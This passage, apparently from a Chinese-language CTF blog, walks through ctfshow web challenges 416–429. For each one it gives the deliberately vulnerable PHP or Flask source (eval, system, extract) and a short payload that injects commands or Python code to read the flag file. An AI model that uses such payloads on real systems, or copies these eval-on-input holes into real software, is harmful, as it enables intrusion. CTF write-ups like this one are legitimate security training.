class="variable">$_GET</span>[f]);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230331222734499.png" alt="image-20230331222734499"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=cft::<span class="variable constant_">flag</span></span><br></pre></td></tr></table></figure><h2 id="web417"><a href="#web417" class="headerlink" title="web417"></a>web417</h2><p>题目</p><p>这里下载下来题目给的php代码，然后解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$c</span>==<span class="string">&#x27;show&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf=show</span><br></pre></td></tr></table></figure><h2 id="web418"><a href="#web418" class="headerlink" title="web418"></a>web418</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 23:52:58</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$key</span>= <span class="number">0</span>;</span><br><span class="line"><span class="variable">$clear</span>=<span class="string">&#x27;clear.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取参数</span></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"><span class="comment">//包含清理脚本</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$clear</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span>===<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="comment">//帮黑阔写好后门</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;&lt;?php &#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;?&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$die</span>?<span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>):<span class="title function_ invoke__">clear</span>(<span class="variable">$clear</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p><p>这里有点误导让你，去写后门，但是$key===0x36d这个是强等于,0x36d 这个是integer整形，但是传的字符串却是字符型，绕不过去，所以这题用变量覆盖修改$clear就可以了，</p><p><strong>extract</strong>   ——-&gt;   变量覆盖</p><p><img src="../images/image-20230401161846730.png" alt="image-20230401161846730"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">die</span>=<span class="number">0</span>&amp;clear=;cp flag.php flag.txt</span><br></pre></td></tr></table></figure><p>payload的意思是，因为if那绕不过去了，所以会执行下面的语句，然后为了能执行clear($clear),所以就让$die为0，然后就可以执行到clear了</p><p><strong>这里加的分号是为了不让rm -rf删掉文件</strong></p><p>然后就会执行clear(rm -rf;cp flag.php flag.txt)</p><h2 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:36:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">17</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=echo `cat f*`;</span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=eval($_POST[1]);&amp;1=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:41:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话是先用    ls 查找flag位置，然后用<code>ls ../</code>找到了flag位置，然后直接读取</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl ../*</span><br></pre></td></tr></table></figure><h2 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">6</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl *</span><br></pre></td></tr></table></figure><h2 id="web422"><a href="#web422" class="headerlink" title="web422"></a>web422</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl *</span><br></pre></td></tr></table></figure><h2 id="web423"><a href="#web423" class="headerlink" title="web423"></a>web423</h2><p>题目</p><h2 id="web424-ssti"><a href="#web424-ssti" class="headerlink" title="web424(ssti)"></a>web424(ssti)</h2><p>题目</p><p><img src="../images/image-20230405212426830.png" alt="image-20230405212426830"></p><p>查看注释发现给了一个参数可以进行传值</p><p><img src="../images/image-20230405212500712.png" alt="image-20230405212500712"></p><p><strong>源码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里因为没有os模块了，那么直接就用open来拿到flag</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/flag).read()</span></span><br></pre></td></tr></table></figure><p>自己导入有个os模块也行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat app.py&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web425-过滤了os"><a href="#web425-过滤了os" class="headerlink" title="web425(过滤了os)"></a>web425(过滤了os)</h2><p>题目</p><p><img src="../images/image-20230405213333700.png" alt="image-20230405213333700"></p><p>还是一样</p><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230405213451936.png" alt="image-20230405213451936"></p><p>使用这个<strong>open</strong>的前提是得知道文件名     <strong>这个不能使用通配符</strong></p><h2 id="web426-过滤了os-popen"><a href="#web426-过滤了os-popen" class="headerlink" title="web426(过滤了os|popen)"></a>web426(过滤了os|popen)</h2><p>题目</p><p><img src="../images/image-20230405213734721.png" alt="image-20230405213734721"></p><p>还是不影响</p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web427-过滤了os-popen-system"><a href="#web427-过滤了os-popen-system" class="headerlink" title="web427(过滤了os|popen|system)"></a>web427(过滤了os|popen|system)</h2><p>题目</p><p><img src="../images/image-20230405213949469.png" alt="image-20230405213949469"></p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen|system&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="web428-过滤os-popen-system-read"><a href="#web428-过滤os-popen-system-read" class="headerlink" title="web428(过滤os|popen|system|read)"></a>web428(过滤os|popen|system|read)</h2><p>题目</p><p><img src="../images/image-20230405214151770.png" alt="image-20230405214151770"></p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>因为这里是只匹配开头</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web429-ssti-过滤了os-open-system-read"><a href="#web429-ssti-过滤了os-open-system-read" class="headerlink" title="web429(ssti 过滤了os|open|system|read)"></a>web429(ssti 过滤了os|open|system|read)</h2><p>题目<img src="../images/image-20230405214409832.png" alt="image-20230405214409832"></p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span 